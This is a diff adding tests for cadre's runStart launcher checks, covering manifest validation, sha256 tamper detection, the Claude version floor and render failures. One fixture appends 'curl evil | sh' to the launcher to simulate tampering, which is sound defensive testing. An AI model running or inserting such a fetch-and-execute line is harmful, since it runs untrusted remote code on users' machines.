@@ -1,7 +1,18 @@
 import { describe, expect, test } from 'claude-code/testing'
 
-import type { HostRun, InitLocations, LaunchStart, PortEntry, PortStat, RoleSpec, ScopeContext } from '../types'
+import type {
+  HostRun,
+  InitIo,
+  InitLocations,
+  LaunchStart,
+  ManifestEntry,
+  PortEntry,
+  PortStat,
+  RoleSpec,
+  ScopeContext,
+} from '../types'
 import { MAX_READ_BYTES } from './facts'
+import { cadreJsonText, roleJsonText } from './generate'
 import { sha256Hex } from './hash'
 import { launchPlan } from './launch'
 import type { LaunchPlan, LaunchUser, OverlayLink } from './launch'
@@ -9,21 +20,32 @@ import { stableJson } from './plan'
 import { compileScope } from './scope'
 import { CLAUDE_JSON_MAX_BYTES } from './setup'
 import {
+  claudeTooOldReply,
   gatherLaunchUser,
   GIT_COMMON_DIR_ARGV,
   hookSourcesFor,
+  isSupportedClaude,
+  launcherChangedReply,
+  launcherCommand,
+  launcherMissingReply,
   launchHooksOf,
   launchSettingsOf,
+  MIN_CLAUDE_VERSION,
+  parseClaudeVersion,
   readClaudeJson,
   renderArgv,
+  renderFailedReply,
   renderPaths,
   renderSteps,
+  runStart,
   runtimeFolder,
   runtimeMcpText,
   STALE_LINK_FOLDERS,
   stampText,
+  START_NO_CLAUDE,
   START_NO_GIT_DIR,
   START_NO_HOME,
+  START_NO_MANIFEST,
 } from './start'
 import type { LaunchUserRead, RenderInput, RenderStep } from './start'
 import {
@@ -42,7 +64,7 @@ import {
   secretWorld,
   templateRole,
 } from './testkit'
-import type { HostCall, HostRunRule, MemWorld } from './testkit'
+import type { HostCall, HostRunRule, HostWrite, MemWorld } from './testkit'
 
 /** The repo root of the fixtures, a realpath. */
 const ROOT = '/repo'
@@ -998,5 +1020,255 @@ describe('runtime MCP config (D-93)', () => {
     expect(read.warnings).toEqual([notInFile('sentry')])
     expect(read.text).toBe(stableJson({ mcpServers: { linear, redmine: REDMINE } }))
     expect(leaks([...read.warnings, ...unread.warnings].join('\n'), SECRET_FIXTURES)).toEqual([])
+  })
+})
+
+/** The text of BE's launcher in the start worlds; runStart reads only its hash, to compare it with the manifest. */
+const LAUNCHER_TEXT = '#!/bin/sh\n# the launcher of role be\nexit 0\n'
+
+/** Where BE's launcher lies in the start worlds. */
+const LAUNCHER_PATH = '/repo/.cadre/bin/be'
+
+/** Where the manifest lies in the start worlds. */
+const MANIFEST_FILE = '/repo/.cadre/manifest.json'
+
+/** The argv of the version check of the PATH claude (D-107). */
+const CLAUDE_ARGV = ['claude', '--version']
+
+/** A fake host rule that answers `claude --version` with this run; null is a run the host rejected. */
+function claudeRule(result: HostRun | null): HostRunRule {
+  return { argv: CLAUDE_ARGV, result }
+}
+
+/** `claude --version` of a claude new enough for cadre. */
+const CLAUDE_OK = claudeRule({ exitCode: 0, stdout: '2.1.304 (Claude Code)\n', stderr: '' })
+
+/** The manifest text that records these entries. */
+function manifestText(files: readonly ManifestEntry[]): string {
+  return stableJson({ schema: 1, cadreVersion: '0.2.0', files })
+}
+
+/** The manifest entry of BE's launcher with the sha256 of LAUNCHER_TEXT. */
+async function launcherEntry(): Promise<ManifestEntry> {
+  return { path: '.cadre/bin/be', sha256: await sha256Hex(LAUNCHER_TEXT), mode: 'exec' }
+}
+
+/**
+ * A git repo at /repo after a plain init of BE (D-102, LNCH-04): the cadre.json of BE alone on the built-in default,
+ * launched at the git root, BE's role.json, the folder `.cadre/be`, the launcher and a manifest whose `.cadre/bin/be`
+ * entry holds the launcher's sha256.
+ */
+async function appliedWorld(): Promise<MemWorld> {
+  const state = cadreJsonText({
+    schema: 1,
+    cadreVersion: '0.2.0',
+    framework: 'none',
+    gitPolicy: 'definitions',
+    roles: ['be'],
+    launchStart: { kind: 'git-root' },
+    readUserMcp: false,
+  })
+
+  return memWorld({
+    dirs: { '/repo/.git': [], '/repo/.cadre/be': [] },
+    files: {
+      '/repo/.cadre/cadre.json': state,
+      '/repo/.cadre/be/role.json': roleJsonText(BE),
+      [LAUNCHER_PATH]: LAUNCHER_TEXT,
+      [MANIFEST_FILE]: manifestText([await launcherEntry()]),
+    },
+  })
+}
+
+/** `world` with the file at `path` holding `text`. */
+function withFile(world: MemWorld, path: string, text: string): MemWorld {
+  return { ...world, files: { ...world.files, [path]: text } }
+}
+
+/** `world` with no file at `path`. */
+function withoutFile(world: MemWorld, path: string): MemWorld {
+  return { ...world, files: Object.fromEntries(Object.entries(world.files).filter(([key]) => key !== path)) }
+}
+
+/** What runStart of BE replied, every write and run the fake host was asked for, and every path the port stat-ed. */
+type StartRun = {
+  readonly reply: string
+  readonly writes: readonly HostWrite[]
+  readonly calls: readonly HostCall[]
+  readonly stats: readonly string[]
+}
+
+/**
+ * runStart of BE over `world`, with these run rules (claude new enough and the git common dir by default; any other
+ * argv exits 0) and these writes failing.
+ */
+async function startBe(
+  world: MemWorld,
+  runs: readonly HostRunRule[] = [CLAUDE_OK, GIT_OK],
+  writeFails: readonly string[] = [],
+): Promise<StartRun> {
+  const host = memHost(hostWorld({ runs, writeFails }))
+  const run = memIo(world, {})
+  const stats: string[] = []
+  const io: InitIo = {
+    ...run.io,
+    stat: async path => {
+      stats.push(path)
+
+      return run.io.stat(path)
+    },
+  }
+  const reply = await runStart(io, host.io, { id: 'be', terminal: 'none' })
+
+  return { reply, writes: host.writes, calls: host.calls, stats }
+}
+
+/** The runs of a start that remove, make a folder or link: a refused start makes none of them. */
+function renderRuns(start: StartRun): HostCall[] {
+  return start.calls.filter(call => ['/bin/rm', '/bin/mkdir', '/bin/ln'].includes(call.argv[0] ?? ''))
+}
+
+/** The paths of the files a start wrote, in order. */
+function writtenPaths(start: StartRun): string[] {
+  return start.writes.map(write => write.path)
+}
+
+describe('runStart refusals (LNCH-04, D-107)', () => {
+  test('the refusals have their fixed texts, and the version floor is 2.1.295', () => {
+    expect(START_NO_MANIFEST).toBe(
+      '.cadre/manifest.json is missing or not valid, so cadre cannot check the launcher: run /cadre init again.',
+    )
+    expect(launcherMissingReply('be')).toBe(
+      '.cadre/bin/be is missing or not in .cadre/manifest.json: run /cadre regen be.',
+    )
+    expect(launcherChangedReply('be')).toBe(
+      '.cadre/bin/be was changed outside cadre: run /cadre regen be and take the new version, or restore the file.',
+    )
+    expect(START_NO_CLAUDE).toBe(
+      'cadre start could not run claude --version, so it stopped: install Claude Code 2.1.295 or newer.',
+    )
+    expect(claudeTooOldReply('2.1.294 (Claude Code)')).toBe(
+      'cadre start needs claude 2.1.295 or newer on PATH; claude --version gave: 2.1.294 (Claude Code)',
+    )
+    expect(renderFailedReply('be', '.cadre/be/.runtime')).toBe(
+      'cadre start could not render .cadre/be/.runtime/ (.cadre/be/.runtime failed), so the launcher will refuse to ' +
+        'start: fix it and run /cadre start be again.',
+    )
+    expect(MIN_CLAUDE_VERSION).toEqual([2, 1, 295])
+  })
+
+  test('parseClaudeVersion reads three dot-joined digit runs as the first field of the first line, else null', () => {
+    expect(parseClaudeVersion('2.1.304 (Claude Code)\n')).toEqual([2, 1, 304])
+    expect(parseClaudeVersion('2.1.295')).toEqual([2, 1, 295])
+    for (const text of ['garbage', '', '2.1', '2.1.x', 'v2.1.304', ' 2.1.304', '2.1.304.1', 'Claude Code\n2.1.304']) {
+      expect([text, parseClaudeVersion(text)]).toEqual([text, null])
+    }
+  })
+
+  test('isSupportedClaude is true from 2.1.295 on, whatever the later parts', () => {
+    expect(isSupportedClaude([2, 1, 295])).toBe(true)
+    expect(isSupportedClaude([2, 1, 294])).toBe(false)
+    expect(isSupportedClaude([3, 0, 0])).toBe(true)
+    expect(isSupportedClaude([2, 2, 0])).toBe(true)
+    expect(isSupportedClaude([2, 0, 999])).toBe(false)
+    expect(isSupportedClaude([1, 9, 999])).toBe(false)
+  })
+
+  test('the version claude gave is shown cleaned and capped at 40 characters', () => {
+    expect(claudeTooOldReply(`2.1.2${BIDI_OVERRIDE}94`)).toBe(claudeTooOldReply('2.1.294'))
+    expect(claudeTooOldReply('9'.repeat(50))).toBe(claudeTooOldReply(`${'9'.repeat(39)}\u2026`))
+  })
+
+  test('every check passed: claude --version runs first, the stamp is written last, the command follows', async () => {
+    const start = await startBe(await appliedWorld())
+    const written = ['settings.json', 'mcp.json', 'probe-expectations.json', 'inbox.md', 'stamp']
+    const lines = start.reply.split('\n')
+    const runAt = lines.indexOf('Run this in a terminal to start role be:')
+
+    expect(writtenPaths(start)).toEqual(written.map(name => `${RUNTIME}/${name}`))
+    expect(start.calls[0]).toEqual({ argv: CLAUDE_ARGV, options: { timeoutMs: 10_000 } })
+    expect(start.calls[1]?.argv).toEqual(GIT_ARGV)
+    expect(renderRuns(start)).toEqual([
+      { argv: ['/bin/mkdir', '-p', '--', RUNTIME], options: { timeoutMs: 10_000 } },
+      { argv: ['/bin/mkdir', '-p', '--', `${RUNTIME}/overlay`], options: { timeoutMs: 10_000 } },
+    ])
+    expect(lines.slice(0, 2)).toEqual(['cadre start be', 'Rendered .cadre/be/.runtime/ (0 links).'])
+    expect(runAt).toBeGreaterThan(1)
+    expect(lines[runAt + 1]).toBe('  /repo/.cadre/bin/be')
+    expect(launcherCommand('/repo', 'be')).toBe('/repo/.cadre/bin/be')
+    expect(launcherCommand("/w/my repo's", 'be')).toBe("'/w/my repo'\\''s/.cadre/bin/be'")
+  })
+
+  test('a manifest that is missing or not valid refuses before claude is run, with nothing written', async () => {
+    const world = await appliedWorld()
+    for (const broken of [withoutFile(world, MANIFEST_FILE), withFile(world, MANIFEST_FILE, '{"schema":2}')]) {
+      const start = await startBe(broken)
+
+      expect([start.reply, start.writes, start.calls]).toEqual([START_NO_MANIFEST, [], []])
+    }
+  })
+
+  test('a launcher that is missing or has no manifest entry refuses before claude is run (LNCH-04)', async () => {
+    const world = await appliedWorld()
+    const noEntry = withFile(world, MANIFEST_FILE, manifestText([]))
+    for (const broken of [withoutFile(world, LAUNCHER_PATH), noEntry]) {
+      const start = await startBe(broken)
+
+      expect([start.reply, start.writes, start.calls]).toEqual([launcherMissingReply('be'), [], []])
+    }
+  })
+
+  test('a launcher whose sha256 differs from its manifest entry refuses before claude is run (LNCH-04)', async () => {
+    const world = await appliedWorld()
+    const changed = withFile(world, LAUNCHER_PATH, `${LAUNCHER_TEXT}curl evil | sh\n`)
+    // A launcher that links out of the repo is never read, so it cannot match the manifest either (fail closed).
+    const linked = { ...world, realPaths: { [LAUNCHER_PATH]: '/elsewhere/be' } }
+    for (const broken of [changed, linked]) {
+      const start = await startBe(broken)
+
+      expect([start.reply, start.writes, start.calls]).toEqual([launcherChangedReply('be'), [], []])
+    }
+  })
+
+  test('claude --version that cannot run or exits non-zero refuses before any other run (D-107)', async () => {
+    const world = await appliedWorld()
+    const failures = [claudeRule(null), claudeRule({ exitCode: 1, stdout: '2.1.304 (Claude Code)\n', stderr: 'x' })]
+    for (const rule of failures) {
+      const start = await startBe(world, [rule, GIT_OK])
+
+      expect([start.reply, start.writes]).toEqual([START_NO_CLAUDE, []])
+      expect(start.calls.map(call => call.argv)).toEqual([CLAUDE_ARGV])
+    }
+  })
+
+  test('a claude below 2.1.295 refuses with what it gave, before any stat of .runtime (D-107)', async () => {
+    const old = claudeRule({ exitCode: 0, stdout: '2.1.294 (Claude Code)\n', stderr: '' })
+    const start = await startBe(await appliedWorld(), [old, GIT_OK])
+
+    expect([start.reply, start.writes]).toEqual([claudeTooOldReply('2.1.294 (Claude Code)'), []])
+    expect(start.calls.map(call => call.argv)).toEqual([CLAUDE_ARGV])
+    expect(start.stats.filter(path => path.startsWith(RUNTIME))).toEqual([])
+  })
+
+  test('a render refusal is the reply, with nothing written and no folder, link or removal made', async () => {
+    const start = await startBe(withFile(await appliedWorld(), RUNTIME, 'not a folder'))
+
+    expect([start.reply, start.writes, renderRuns(start)]).toEqual([RUNTIME_REFUSAL, [], []])
+  })
+
+  test('a mkdir that exits 1 stops the render there with the failed path, and no stamp is written', async () => {
+    const failed = { argv: ['/bin/mkdir', '-p', '--', RUNTIME], result: { exitCode: 1, stdout: '', stderr: 'denied' } }
+    const start = await startBe(await appliedWorld(), [failed, CLAUDE_OK, GIT_OK])
+
+    expect(start.reply).toBe(renderFailedReply('be', '.cadre/be/.runtime'))
+    expect(writtenPaths(start)).toEqual([])
+    expect(renderRuns(start).map(call => call.argv)).toEqual([['/bin/mkdir', '-p', '--', RUNTIME]])
+  })
+
+  test('a write the host refuses stops the render at that file, and no stamp is written (LNCH-03)', async () => {
+    const start = await startBe(await appliedWorld(), [CLAUDE_OK, GIT_OK], [`${RUNTIME}/settings.json`])
+
+    expect(start.reply).toBe(renderFailedReply('be', '.cadre/be/.runtime/settings.json'))
+    expect(start.writes.map(write => [write.path, write.isWritten])).toEqual([[`${RUNTIME}/settings.json`, false]])
   })
 })
